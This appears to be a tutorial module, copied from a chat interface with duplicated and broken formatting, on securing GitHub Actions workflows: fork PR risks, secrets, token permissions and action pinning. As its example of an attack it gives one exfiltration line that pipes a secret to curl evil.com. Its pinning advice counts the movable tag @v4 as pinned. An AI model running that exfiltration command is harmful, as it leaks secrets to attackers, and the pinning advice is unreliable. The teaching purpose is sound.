# 🔐 Module 03: Security Best Practices in GitHub Actions

> Protect your workflows from secret leaks, token abuse, fork PR attacks, and insecure dependencies.

---

## 🚨 1. NEVER Expose Secrets to Forked Pull Requests

### ⚠️ Common Mistake:

```yaml
on:
  pull_request_target:  # ❌ Dangerous
🔐 Module 03: Security Best Practices in GitHub Actions
🧠 Goal: Learn how to secure your CI/CD pipelines against common attacks, leaks, and misconfigurations — especially in public and collaborative environments.

🛡️ Why Security in CI/CD Matters
CI/CD runs your code and executes it — with permissions, secrets, tokens, and workflows. One wrong configuration could:

Leak secrets to attackers

Allow malicious PRs to run untrusted code

Over-permission tokens to do more than they should

Execute code from compromised actions

🔐 DevSecOps begins here — in your workflows.

📁 Create Module Folder
bash
Copy
Edit
mkdir Module-03-Security-Best-Practices
📄 Create README.md
bash
Copy
Edit
nano Module-03-Security-Best-Practices/README.md
Paste the full content below:

markdown
Copy
Edit
# 🔐 Module 03: Security Best Practices in GitHub Actions

> Protect your workflows from secret leaks, token abuse, fork PR attacks, and insecure dependencies.

---

## 🚨 1. NEVER Expose Secrets to Forked Pull Requests

### ⚠️ Common Mistake:

```yaml
on:
  pull_request_target:  # ❌ Dangerous
This lets external PRs run with your repo’s secrets!

Attackers can open a PR with code like echo $SUPER_SECRET | curl evil.com

✅ Safer Alternative
yaml
Copy
Edit
on:
  pull_request:
    branches: [main]  # ✅ Secrets are not exposed
And use this pattern to prevent forked PRs from running untrusted code:

yaml
Copy
Edit
if: github.event.pull_request.head.repo.full_name == github.repository
🔐 2. Use Secrets the Right Way
✅ Store tokens/keys here:
GitHub → Settings → Secrets → Actions

yaml
Copy
Edit
- name: Use API
  run: curl -H "Authorization: Bearer ${{ secrets.MY_TOKEN }}" https://api.example.com
Never hardcode secrets in YAML or scripts.
Secrets are encrypted and masked in logs by default.

🔒 3. Minimize GitHub Token Permissions
By default, the GITHUB_TOKEN used in workflows has broad permissions (write to PRs, issues, etc.).

✅ Set to read-only:
yaml
Copy
Edit
permissions:
  contents: read
Then explicitly add only what you need:

yaml
Copy
Edit
permissions:
  contents: read
  deployments: write
  issues: write
📌 Since April 2025, GitHub requires permission scopes for deployments.

📌 4. Always Pin Action Versions
Avoid:

yaml
Copy
Edit
uses: actions/checkout@v4  # ✅ GOOD
uses: some-action/some@main  # ❌ BAD
Why?

@main can change at any time → supply chain risk

You could unknowingly run malicious or broken code

🧪 5. Validate PRs Before Trusting Code
Use this in pull_request_target workflows ONLY IF:

You explicitly check if the user is trusted

You avoid running user code directly

You gate secrets behind manual review

📊 6. Monitor Workflow Logs and Alert on Failures
Use actions/github-script to create issues on failure

Send notifications (Slack, Discord, Email)

Use on: workflow_run to trigger diagnostics

🧱 7. Reusable, Secure Workflow Template
yaml
Copy
Edit
name: Secure CI

on:
  pull_request:

permissions:
  contents: read
  checks: write

jobs:
  secure-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Security scan here"
✅ Summary Best Practices
Practice	Why
✅ No pull_request_target with secrets	Prevents fork attacks
✅ Pin action versions	Prevents dependency hijack
✅ Use permissions: explicitly	Reduces token abuse
✅ Store secrets only in secrets.*	Never hardcoded
✅ Use if: to filter PR sources	Reduce risk from forks

🧠 Challenge Lab
Create a secure CI workflow with:

Secrets

Permission-limited token

Version-pinned actions

PR filter logic

Push a PR from a fork and confirm secrets are not exposed

Add a comment or label to untrusted PRs (via github-script)

yaml
Copy
Edit

---

## ✅ Commit and Push

```bash
git add .
git commit -m "Module 3: Security Best Practices in GitHub Actions"
git push origin main
